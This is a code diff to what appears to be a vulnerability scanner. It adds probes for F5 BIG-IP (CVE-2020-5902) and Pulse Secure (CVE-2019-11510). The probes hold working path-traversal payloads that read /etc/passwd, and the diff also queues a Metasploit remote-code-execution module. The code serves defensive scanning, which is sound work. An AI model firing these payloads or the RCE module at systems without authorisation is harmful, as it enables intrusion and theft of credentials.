@@ -39,7 +39,7 @@ import (
 
 // metasploitNativeProbeCount is the number of native Go probe functions called
 // in MetasploitAgent.Run. Update this constant whenever a probe is added or removed.
-const metasploitNativeProbeCount = 17
+const metasploitNativeProbeCount = 19
 
 // MetasploitAgent orchestrates Metasploit-based web exploit checks.
 type MetasploitAgent struct {
@@ -90,6 +90,8 @@ func (a *MetasploitAgent) Run(ctx context.Context, input AgentInput) (AgentOutpu
 	output.Findings = append(output.Findings, probePHPUnitEvalStdinRCE(ctx, client, input.Target, input.AuthProfile)...)
 	output.Findings = append(output.Findings, probeGrafanaPluginTraversal(ctx, client, input.Target, input.AuthProfile)...)
 	output.Findings = append(output.Findings, probeVBulletinWidgetTemplateRCE(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probeF5BIGIPTMUITraversal(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probePulseSecureFileDisclosure(ctx, client, input.Target, input.AuthProfile)...)
 
 	// ── Phase 2: Metasploit RPC (optional, when msfrpcd is reachable) ─────
 	msfURL := strings.TrimSpace(os.Getenv("MSF_RPC_URL"))
@@ -986,6 +988,126 @@ func probeVBulletinWidgetTemplateRCE(ctx context.Context, client *http.Client, t
 	return nil
 }
 
+// probeF5BIGIPTMUITraversal tests for F5 BIG-IP TMUI file read exposure
+// (CVE-2020-5902) through known fileRead.jsp traversal payloads.
+func probeF5BIGIPTMUITraversal(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	if err := validateMetasploitProbeTarget(target); err != nil {
+		return nil
+	}
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	paths := []string{
+		"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
+		"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts",
+	}
+
+	for _, p := range paths {
+		probeURL := base + p
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		resp.Body.Close()
+		bodyLower := strings.ToLower(string(body))
+
+		leakDetected := strings.Contains(bodyLower, "root:x:0:0:") || strings.Contains(bodyLower, "localhost")
+		if resp.StatusCode == http.StatusOK && leakDetected {
+			return []model.Finding{{
+				ID:          "msf-f5-bigip-tmui-traversal",
+				Category:    "path_traversal",
+				Severity:    model.SeverityHigh,
+				Title:       "F5 BIG-IP TMUI file read indicator (CVE-2020-5902)",
+				Description: "The BIG-IP TMUI fileRead endpoint returned local file content via a traversal sequence, indicating CVE-2020-5902 exposure that can lead to configuration theft and potential remote code execution.",
+				Evidence:    fmt.Sprintf("path=%s status=%d leak_detected=true", p, resp.StatusCode),
+				Recommendation: "Upgrade BIG-IP to a patched release and restrict management interface access to trusted networks only. Apply vendor mitigation guidance for TMUI exposure immediately.",
+				AffectedURL:     probeURL,
+				OWASPCategory:   "OWASP A05:2021 - Security Misconfiguration",
+				CWE:             "CWE-22",
+				CVSSScore:       9.8,
+				CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+				MITRETechniques: []string{"T1190", "T1005"},
+				References: []string{
+					"https://nvd.nist.gov/vuln/detail/CVE-2020-5902",
+					"https://www.rapid7.com/db/modules/exploit/linux/http/f5_bigip_tmui_rce/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
+// probePulseSecureFileDisclosure tests for Pulse Secure arbitrary file read
+// (CVE-2019-11510) by requesting a known traversal path.
+func probePulseSecureFileDisclosure(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	if err := validateMetasploitProbeTarget(target); err != nil {
+		return nil
+	}
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	paths := []string{
+		"/dana-na/../dana/html5acc/guacamole/../../../../../../../../etc/passwd",
+		"/dana-na/../dana/html5acc/guacamole/../../../../../../../../etc/hosts",
+	}
+
+	for _, p := range paths {
+		probeURL := base + p
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		resp.Body.Close()
+		bodyLower := strings.ToLower(string(body))
+
+		leakDetected := strings.Contains(bodyLower, "root:x:0:0:") || strings.Contains(bodyLower, "localhost")
+		if resp.StatusCode == http.StatusOK && leakDetected {
+			return []model.Finding{{
+				ID:          "msf-pulse-secure-file-disclosure",
+				Category:    "path_traversal",
+				Severity:    model.SeverityHigh,
+				Title:       "Pulse Secure arbitrary file read indicator (CVE-2019-11510)",
+				Description: "The Pulse Secure appliance exposed local file content through a traversal path under /dana-na, indicating CVE-2019-11510 and possible credential/session theft risk.",
+				Evidence:    fmt.Sprintf("path=%s status=%d leak_detected=true", p, resp.StatusCode),
+				Recommendation: "Apply Ivanti/Pulse Secure patches immediately and rotate VPN credentials and session material that may have been exposed.",
+				AffectedURL:     probeURL,
+				OWASPCategory:   "OWASP A05:2021 - Security Misconfiguration",
+				CWE:             "CWE-22",
+				CVSSScore:       10.0,
+				CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+				MITRETechniques: []string{"T1190", "T1005"},
+				References: []string{
+					"https://nvd.nist.gov/vuln/detail/CVE-2019-11510",
+					"https://www.rapid7.com/db/vulnerabilities/pulse-secure-vpn-cve-2019-11510/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
 func validateMetasploitProbeTarget(target string) error {
 	if strings.EqualFold(strings.TrimSpace(os.Getenv("ABH_ALLOW_LOCAL_TARGETS")), "true") {
 		return nil
@@ -1126,6 +1248,18 @@ func runMSFRPCModules(ctx context.Context, client *http.Client, rpcURL, password
 			title:   "vBulletin Widget Template RCE (CVE-2019-16759)",
 			cve:     "CVE-2019-16759",
 			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl, "TARGETURI": "/"},
+		},
+		{
+			name:    "exploit/linux/http/f5_bigip_tmui_rce",
+			title:   "F5 BIG-IP TMUI RCE (CVE-2020-5902)",
+			cve:     "CVE-2020-5902",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+		{
+			name:    "auxiliary/gather/pulse_secure_file_disclosure",
+			title:   "Pulse Secure File Disclosure (CVE-2019-11510)",
+			cve:     "CVE-2019-11510",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
 		},
 	}
 
